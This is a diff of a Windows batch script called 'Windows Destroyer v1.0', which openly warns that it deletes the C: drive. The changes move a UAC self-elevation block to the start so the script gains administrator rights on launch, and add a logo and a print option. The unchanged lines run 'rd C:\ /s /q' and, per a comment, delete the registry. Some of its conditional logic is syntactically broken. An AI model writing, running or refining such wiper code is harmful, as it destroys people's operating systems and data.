@@ -1,7 +1,17 @@
 @echo off
+fltmc >nul 2>&1 || (
+    PowerShell Start -Verb RunAs '%0' 2> nul || (
+        >nul pause && exit 1
+    )
+    exit 0
+)
+cd /d %~dp0
+
 :start
 cls
 title Windows Destroyer v1.0
+call logo.bat
+echo.
 echo WARNING!
 echo This tool is designed to delete your C:\ Drive, thus delete Windows.
 echo THIS TOOL MUST NOT BE USED ON YOUR HOST MACHINE (=A REAL DEVICE)
@@ -23,12 +33,7 @@ echo Are you SURE you want to continue? ([Y]es/[N]o/[P]rint)
 set /p choice= ^>
 if /i "%choice%"=="N" exit
 if NOT /i "%choice%"=="Y" goto Y
-fltmc >nul 2>&1 || (
-    PowerShell Start -Verb RunAs '%0' 2> nul || (
-        >nul pause && exit 1
-    )
-    exit 0
-)
+if /i "%choice%"=="P" goto print
 ::Delete C:\
 rd C:\ /s /q
 ::Delete Registry
